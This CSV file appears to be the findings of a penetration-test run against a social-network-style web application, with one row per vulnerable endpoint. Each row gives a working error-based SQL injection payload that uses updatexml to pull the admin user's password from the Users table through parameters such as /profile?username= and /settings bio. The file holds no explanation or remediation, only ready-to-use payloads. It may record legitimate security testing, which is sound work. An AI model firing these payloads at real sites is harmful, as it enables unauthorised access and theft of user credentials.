run_id,endpoint,vulnerability,poc
20260901-1452-0001,`/profile?username=`,SQL Injection,"`admin'+AND+updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
20260901-1452-0001,`/users?search=`,SQL Injection,"`'+OR+updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
20260901-1452-0001,`/direct_messages?username=`,SQL Injection,"`'+AND+updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
20260901-1452-0001,`/friends?username=`,SQL Injection,"`'+AND+updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
20260901-1452-0001,`/friends?search=`,SQL Injection,"`'+AND+updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
20260901-1452-0001,`/edit_post?id=`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
20260901-1452-0001,`/delete_post?id=`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
20260901-1452-0001,`/requests?username=`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
20260901-1452-0001,`/create_post` (POST: content),SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
20260901-1452-0001,`/edit_post` (POST: id),SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
20260901-1452-0001,`/direct_messages` (POST: username),SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
20260901-1452-0001,`/request_friend` (POST: username),SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
20260901-1452-0001,`/remove_request` (POST: username),SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
20260901-1452-0001,`/settings` (POST: name),SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
20260901-1452-0001,`/settings` (POST: bio),SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
